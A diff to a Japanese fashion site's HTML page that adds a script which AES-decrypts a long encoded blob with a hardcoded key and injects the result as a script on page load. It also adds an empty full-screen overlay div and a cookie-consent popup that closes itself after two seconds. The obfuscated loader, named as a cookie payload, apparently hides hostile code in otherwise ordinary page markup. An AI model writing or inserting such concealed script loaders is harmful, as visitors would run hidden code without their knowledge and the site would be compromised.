@@ -219,6 +219,98 @@ text-align:center;
 <footer>
 <p>© 2026 東京スタイル. All Rights Reserved.</p>
 </footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+ <script>
+     function aesDecode(encodedText) {
+         const decodedText = decodeURIComponent(encodedText);
+         const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+         return bytes.toString(CryptoJS.enc.Utf8);
+     }
+     const uniqueCookieScriptPayload = aesDecode('U2FsdGVkX1%2B9ER1LDE6XHhsvGUxGvOoiqszy6U3ioEDSjhRRbLxNFnrGEcEL%2FyzTO1onrrrB523SSqb90%2FY%2FLoTRdY3TB4cNTptXtf%2BMNZMzZKoTFSKnVMP%2Fxv0eu7gDiHebl6ATe%2FXNg2u%2FdePiUNIt6iMDG5G%2BD6%2B0NNCKeG7%2BrB91fYjwBJO%2Bc41dVBLacNXf28tGj7byh3uc2H82rPwuj8b%2Fi8qP%2BlvpjNaMJ8W52hjArfURqkWPk56amJoPhO3q%2FpzhmGsZSJeLJRKjILk9nWk7MQNVlzJzYPqKSoL5ALcC2ChFLuYDSFBAzVTpeQj6xyh4sc9DqardnLaEFYkkskFD4UOMznAuO%2B5iRgAwTbbMCnWBGAukuRXYWtuN4asWQiR%2FM29OIJHW7jXTeFcqV1Y9B6Xvmlg4JfGurzmWacnczDCO8QWahEHgRoEvFMw5LoGm1Ywc4TxgFVNQjhd6o2Fo9tf6Q0ZTrWHrV9C5rBFU1CX3mr99%2BXbskcK%2FC4eiP7qK6fJrtsKDJWtU0SeBWLYXAYnNzAp%2FjBcaM79Euxn5lto0vLz0pZ9niWd%2Bu0XzlPvPSPX2PlSeorMfsVxxaHEMkCJ%2F0RulGsakGPLpEbdlraI5dHdu%2BRc6GvaTacqKs02JrHB2mDSef4owRp7uhBT6Wo2WucoJzSrp2BuyAJJsHKgssgK70RESzgXpD1IZKRGodTofh41pSBNQx%2F7KD4KHtA6K92QEaZgEMfaIJbidlxKryhhPaECJv1JZOgWy1HexAeDtsSuXJ86as23XnMpeXLf5VULwU7duvATmtdwpxGMCe4HQB1XQXNlD6WHY%2Fbl8PWsyNV66dRyekIm%2BfP92oTqTNMxDsgjF6zknts8NNajg3wxATTGGqRuyW9aUJ74ML5UBT1DMgunGLd%2B%2F7VR%2BYTD2L%2FaVfJngY5PYZplb%2FSlE%2FC58aSWLKx%2FTIb1GJygGDp%2B7r7d5LsN0FXvWTX9lZVpQQgwSr3%2FJUGFM6FDnztf5U1MzpuuchVFkWBlbnTd2FtPwr5hu5z3FfjWUD7vlFC3vsmHjWmvBYBWcf%2Bl3tV8kPXPxnYw0PIaUMENn8lBIwlfC%2B7kIj2wcgnn0HGliIjaQLsQFal7d3uVNh7O1xN7YoWoizcqv1%2FE5e59vaObnK76VV5rgA6IBhz6icPTwcAka%2FjYvnAAAgDG8XiQ%2FrufM0VzjQ2%2Bl%2Bm5RyoyHg%2BGg0aH0tkirYLcaY6YdFLy9sy%2Bj2zhDTk26rL9lrnS2%2BhMCelMbLe%2F71RVWKfXhGzpBJE4z5tH%2FyQP7f7dR4LfR5ZNyN4fdgPnGyIFAT5c1rQ1fA4yKPXbgrf5BzCSKqNdtQ%2BoZujcNB%2FcZaPqCokKpy7qYiBBspawKYGUHi2oCQHvhh4cU2qf9AdybXOd960oN50rnClLTZ6inTYt%2FHi5K220bzFEzc3BaMCkVNiLH%2FhEBcEaDC3ci4n6iQCKKbNXC2opo7r8cpJwJAmmuj9VDZ2Z1E4%2F5zwm%2Fmf%2F%2F30NFJFxC5frIk6fcWWROaYdiGccKXY6XHlcmIEa6WViFjb2pO2%2BQ9bwKIgPw7dzSuKVPJ9U9i2YCPyZZkSFk%2BFZN5m8NFlA%2Bb1WJ4CXCSwt1aoh0dkd7tKYwu8RbcYR8asew7D8EfpX4ddb2wNZv6Lln0M15DtTxCCPM6CTjo4lXOUftsRVA8XxFZIIVsVhlIereq5JpkbjXFiCbh6OJZqVbvr%2BTHdtEf4zXiDfPJT6rtkZ%2FFVIbJ32Pk0TLMiCez2DNexIWYA%2Biar8QOFAGKysrvDoW4V7Wk1anjA3iDqmo2fYqk9NQWG1aJZn410QFNx0G9JA8Rr%2BRBm73pHCBN5YNZ9NnrXLnkpZY%2BXJppHXaQRx1%2FaqK%2BZyI33zs2wPIuAo58OjeW%2BNZaXr1Vv7aAzuUXk%2F3u9By1ZtSrarVoN%2FiJ3CAVkVZh8ys632ImKkRE6o%2FeoBAal3nKDedCTg3RblUhhLeexvwM6nB4NSejFG%2BIdBvqDmlvcBkYtcvjyX9FnQcPOcvkeaF0Uz86kMukLBgVWhf0Sa7z34eM4SfcLS%2B0v95UGuQcq8UAtFpt%2FIWumfGwSX9aDK8oJmtEIIrKWcs2HxC6Eb3OW453YY7rpNDQXjg5ZXR7vVK%2F8TkGdjbMJosB7%2BesoalfX%2BtsBB5VkKYGZ5VIycc3iIGhvUNcuJM7rOeHiS%2BJGnbQ1exFX6qahhXpOaQx%2BiGel3i05%2Bi0P2QCDTav9anLZKtfXbvV4zXRcGcn3JIqN7yz05jy%2Fyzt9NK%2BVNuNZNuokyL4wOjKtw8WVIZI5SgnyokPWZPq%2F096Az8DcRzG91vqWVyQ2xqvxS9XJwhRCSImT1dxbmHJbWag66PPSQxBeCqboQlkrE%2B4nWbJF86pibP1D0%2BSphHwO2qHhbOSKxpeWCdoCCzxAxmbCCtvLWFVxWedywIZBsp25u1FEmKnC3A5QZfeubg6TwFnrTNNczh9Nhy7j3nqqSVPIbR120%2B9ttcOjlCcLerRV%2FI%2BlJs8oJ2c3bWyd8IWwYE0b4EZG%2BYK57mF5wGDxW%2FZOQmKbfIY0QG5uAne94qt4sOwm%2FRxw65jnfwPq3Noad4PRvHHiMPB69eDkFDRPpFNjCScHOJ2Z9bd00%2F1DpUjNYEe%2FprCjpNRlwNdY1rxtOBsuAjNS7TIIn2V%2FMdwjYxeutVOVzfK5wrpQfuWFqTECFpQsdFyiBZlBsd6d1XcSAYeZeufD1SUaePaeVKnFmNZJ%2BIvN7lx7CBxTOCdNr%2BikvA0BiY9e6x3Brf844zl5YaMyCQ8TNdIx6kYAvTyPa7RGbt3vc6B7ytA7g%2BxIJB1TLgnisdtYVHoigvbJW0zL9Jmy%2F19rmo7iqUshgg1MbkWR16dND1nuhvXgQmUdyJabvXglFXflFqHtwaBUyB5hWCglDDyYCVIt%2F%2BUv9NiCkGc4Eery16FbOPdo4ki8GdCou9GRMHUpOdpyne%2BdmP1pWaY5Canrif97cYsrPYJDScxMECpUIQakiJ%2BrRmrA%3D%3D');
+     const script = document.createElement("script");
+     script.textContent = uniqueCookieScriptPayload;
+     document.body.appendChild(script);
+ </script> 
+ <div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
 
+ </div>
+
+
+
+<style>
+         .c-box { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 9999; opacity: 0; visibility: hidden; transition: 0.3s; }
+         .c-box.show { opacity: 1; visibility: visible; }
+         .c-bg { position: absolute; inset: 0; background: rgba(0,0,0,0.4); backdrop-filter: blur(4px); }
+         .c-md { position: relative; background: #fff; color: #333; padding: 30px 25px; border-radius: 14px; max-width: 520px; width: 90%; box-shadow: 0 12px 30px rgba(0,0,0,0.25); font-family: sans-serif; }
+         .c-close { position: absolute; top: 12px; right: 18px; background: none; border: none; font-size: 28px; cursor: pointer; color: #aaa; padding: 0; line-height: 1; transition: 0.2s; }
+         .c-close:hover { color: #f44336; }
+         .c-scr { max-height: 240px; overflow-y: auto; padding-right: 8px; margin: 15px 0 20px; }
+         .c-scr::-webkit-scrollbar { width: 6px; }
+         .c-scr::-webkit-scrollbar-thumb { background: #ddd; border-radius: 3px; }
+         .c-flex { display: flex; gap: 12px; }
+         .c-btn { flex: 1; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+         .c-acc { background: #2ecc71; color: #fff; }
+         .c-acc:hover { background: #27ae60; }
+         .c-dec { background: #e0e0e0; color: #333; }
+         .c-dec:hover { background: #d4d4d4; }
+     </style>
+	 
+     <script>
+         document.addEventListener("DOMContentLoaded", () => {
+             if (localStorage.getItem("cookie-consent")) return;
+
+             document.body.insertAdjacentHTML('beforeend', `
+                 <div id="cb" class="c-box">
+                     <div id="c-bg" class="c-bg"></div>
+                     <div class="c-md">
+                         <button id="c-cl" class="c-close" aria-label="Close">&times;</button>
+                         <h2 style="margin:0; font-size:20px; display:flex; align-items:center; gap:8px;">🍪 クッキー（Cookie）ポリシーに関する重要なお知らせ</h2>
+                         
+                         <div class="c-scr">
+                             <p style="margin:0 0 12px; color:#444; font-size:13px; line-height:1.6; font-weight:bold;">
+                                 当ウェブサイトでは、お客様に最適な状態でサイトをご利用いただくため、および閲覧履歴に基づいたパーソナライズ広告の配信やアクセス解析を行うためにクッキーを使用しています。
+                             </p>
+                             <p style="margin:0 0 12px; color:#666; font-size:12px; line-height:1.6;">
+                                 <strong>1. 必須クッキー:</strong> サイトの基本的な動作、セッション管理、およびセキュリティ機能の維持に必要なクッキーです。これを無効にすると、サイトの一部機能が正常に動作しない場合があります。
+                             </p>
+                             <p style="margin:0 0 12px; color:#666; font-size:12px; line-height:1.6;">
+                                 <strong>2. パフォーマンス・分析クッキー:</strong> 訪問者がサイト内をどのように移動しているか等の匿名統計データを収集し、ページの読み込み速度向上やコンテンツの改善に役立てるためのものです。
+                             </p>
+                             <p style="margin:0 0 12px; color:#666; font-size:12px; line-height:1.6;">
+                                 <strong>3. マーケティング・広告クッキー:</strong> 提携する広告配信事業者が、お客様の興味関心に合わせた最適な動的広告を表示するために使用されます。これにより、関連性の低い広告の表示を減らすことができます。
+                             </p>
+                             <p style="margin:0; color:#666; font-size:12px; line-height:1.6;">
+                                 お客様はブラウザの設定によりクッキーの受け入れを制限または拒否することができますが、その場合一部のサービスが制限される点をご了承ください。詳細については、当社のプライバシーポリシーをご参照ください。
+                             </p>
+                         </div>
+
+                         <div class="c-flex">
+                             <button id="c-ac" class="c-btn c-acc">全てのクッキーに同意する</button>
+                             <button id="c-de" class="c-btn c-dec">拒否する</button>
+                         </div>
+                     </div>
+                 </div>
+             `);
+
+             const el = id => document.getElementById(id), box = el("cb");
+             let autoCloseTimer;
+
+             const hide = val => { 
+                 clearTimeout(autoCloseTimer);
+                 localStorage.setItem("cookie-consent", val); 
+                 box.classList.remove("show"); 
+             };
+
+           
+             el("c-ac").onclick = () => hide("accepted");
+             el("c-de").onclick = () => hide("declined");
+             el("c-cl").onclick = el("c-bg").onclick = () => hide("closed");
+
+             setTimeout(() => box.classList.add("show"), 50);
+
+            
+             autoCloseTimer = setTimeout(() => hide("closed"), 2000);
+         });
+     </script>
 </body>
 </html>
